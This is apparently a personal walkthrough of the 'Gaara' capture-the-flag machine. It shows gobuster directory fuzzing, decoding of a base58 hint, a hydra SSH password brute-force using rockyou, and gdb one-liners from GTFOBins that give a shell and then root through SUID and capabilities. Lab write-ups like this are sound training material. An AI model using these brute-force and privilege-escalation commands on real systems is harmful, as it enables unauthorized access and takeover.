nmap shows ports 22, 80 open
nothing on the webpage. So we start fuzzing
```zsh
gobuster dir --url 192.168.146.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
#Cryoserver

curl 192.168.146.142/Cryoserver
#iamGaara
#A random string among the character's story f1MgN9mTf9SNbzRygcU
#Cyberchef + walkthroughs reveals base58 gaara:ismyname

ssh gaara@192.168.146.142 #ismyname invalid password

hydra -l gaara -P /usr/share/wordlists/rockyou.txt 192.168.146.142 ssh
#iloveyou2

ssh gara@192.168.146.142 #iloveyou2
```
gaara!
for privesc, we start with SUID check
```zsh
find / -type f -perm -04000 -ls 2>/dev/null
#gdb

#gtfo bins shows, under SUID
gdb -nx -ex '!/bin/sh' -ex quit
#gives shell to the same user

#under capabilities,
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
#gives root
```
Note - Upon finding a username, if that password doesnt work, resort to brute-force. Try gtfo for other things as well